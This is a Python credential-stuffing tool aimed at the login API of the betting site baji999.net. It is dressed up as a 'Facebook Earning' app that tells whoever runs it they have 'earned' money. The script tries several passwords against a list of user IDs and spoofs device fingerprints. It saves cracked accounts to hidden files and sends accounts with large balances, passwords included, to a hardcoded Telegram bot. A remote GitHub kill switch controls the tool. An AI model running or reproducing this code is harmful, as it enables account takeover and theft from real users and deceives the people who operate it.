import os
import json
import time
import shutil
import random
import threading
import http.client
import requests

from concurrent.futures import ThreadPoolExecutor, as_completed


# ===================== COLORS =====================
BOLD = "\x1b[1m"
R = "\x1b[91m"
G = "\x1b[92m"
Y = "\x1b[93m"
C = "\x1b[96m"
D = "\x1b[0m"

domain = "baji999.net"


# ===================== LOGO =====================
def show_logo():
    os.system("cls" if os.name == "nt" else "clear")

    COLORS = [
        "\x1b[38;5;27m",
        "\x1b[38;5;33m",
        "\x1b[38;5;39m",
        "\x1b[38;5;45m",
        "\x1b[38;5;51m",
    ]

    ASCII = """
   _______      ____              _
  / __/ _ )____/ __/__ ________  (_)__  ___ _
 / _// _  /___/ _// _ `/ __/ _ \/ / _ \/ _ `/
/_/ /____/   /___/\_,_/_/ /_//_/_/_//_/\_, /
                                      /___/
    """

    subtitle = "Facebook Earning V-0.1"
    width = shutil.get_terminal_size(fallback=(80, 20)).columns

    for i, line in enumerate(ASCII.splitlines()):
        print(COLORS[i % len(COLORS)] + BOLD + line.center(width) + D)

    print(COLORS[-1] + BOLD + subtitle.center(width) + D + "\n")


# ===================== USER AGENTS =====================
mobile_user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Samsung Galaxy S22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Huawei P30 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; OnePlus 6T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36",
]


def get_random_mobile_ua():
    return random.choice(mobile_user_agents)


# ===================== GLOBALS =====================
lock = threading.Lock()
request_count = 0


# ===================== LOGIN ATTEMPT =====================
def attempt_login(user_id, pw):
    global request_count

    headers = {
        "User-Agent": get_random_mobile_ua(),
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Referer": f"https://{domain}/bd/en/login",
        "Origin": f"https://{domain}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    payload = {
        "languageTypeId": 1,
        "currencyTypeId": 8,
        "getIntercomInfo": True,
        "userId": user_id.lower(),
        "password": pw.capitalize(),
        "isBioLogin": False,
        "loginTypeId": 0,
        "fingerprint2": "58df140599f977faf8951888e888e807",
        "fingerprint4": "f91cf49459fdec23221fc66161a3fa20",
        "browserHash": "3969af0f2862ebb0d85edf6ea8430292",
        "deviceHash": "15cfad26f3a3679721b1e64b20fee5ec",
    }

    try:
        with lock:
            request_count += 1
            if request_count % 100 == 0:
                time.sleep(15)

        conn = http.client.HTTPSConnection(domain, timeout=5)
        conn.request(
            "POST",
            "/api/wv/v1/user/login",
            body=json.dumps(payload),
            headers=headers,
        )

        response = conn.getresponse()

        if response.status != 200:
            print(f"{R} FAILED ERROR >> {response.status}{D}")
            time.sleep(10)
            return

        data = json.loads(response.read().decode())
        status = data.get("status")

        if status == "000000":
            user = data.get("data", {})
            uid = user.get("userId")
            uname = user.get("userName")
            balance = user.get("mainWallet", "0")
            level = user.get("vipInfo", {}).get("nowVipName", "N/A")

            profile = "Good" if level != "Normal" else "Poor"
            earned = "2 BDT" if level != "Normal" else "1 BDT"

            if int(balance) >= 10000:
                print(f"{C}{uname} | Profile : {profile} | Earned : 100 BDT{D}")
                send_ids(uid, pw, balance, level)

            elif 1500 <= int(balance) <= 9999:
                print(f"{G}{uname} | Profile : {profile} | Earned : 20 BDT{D}")
                send_ids(uid, pw, balance, level)

            else:
                print(f"{Y}{uname} | Profile : {profile} | Earned : {earned}{D}")

            file_name = ".normal.txt" if level == "Normal" else ".high.txt"
            with open(file_name, "a", encoding="utf-8") as f:
                f.write(f"{uid} | {pw} | Balance: {balance} | Level: {level}\n")

        elif status == "S0001":
            print(f"{R} [!] TURN OFF YOUR DATA FOR A WHILE (API LIMIT){D}")
            time.sleep(30)

    except Exception as e:
        print(f"{R} Error: {e}{D}")
        time.sleep(3)


# ===================== TELEGRAM =====================
def send_ids(uid, pw, balance, level, retries=3, delay=2):
    BOT_TOKEN = "7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM"
    CHAT_ID = "-1003275746200"

    msg = f"[BJ-OK] `{uid} | {pw}`\nBalance : {balance} | Level : {level}"

    for _ in range(retries):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"},
            )
            r.raise_for_status()
            break
        except Exception as e:
            print(f"{R} Telegram send error: {e}{D}")
            time.sleep(delay)


# ===================== MAIN LOGIN =====================
def login():
    show_logo()

    file = ".uids.txt"
    pas1 = input(f"{Y} PASSWORD 1 : {D}")
    pas2 = input(f"{Y} PASSWORD 2 : {D}")
    pas3 = input(f"{Y} PASSWORD 3 : {D}")
    pas4 = input(f"{Y} PASSWORD 4 : {D}")

    passwords = [pas1, pas2, pas3, pas4]

    with open(file, "r") as f:
        users = [line.strip().split()[0] for line in f if line.strip()]

    print(f"{Y}[>] CRACKING STARTED | TOTAL USERS [{len(users)}]{D}\n")

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = [
            executor.submit(attempt_login, u, p)
            for u in users
            for p in passwords
        ]

        for future in as_completed(futures):
            future.result()


# ===================== SWITCH =====================
def switch():
    try:
        s = requests.get(
            "https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch"
        ).text

        if "ON" not in s:
            print(f"{R} THIS TOOL HAS BEEN DISABLED BY ADMIN!{D}")
            exit(0)

    except Exception as e:
        print(f"{R} Switch check failed: {e}{D}")
        exit(0)


# ===================== RUN =====================
if __name__ == "__main__":
    switch()
    login()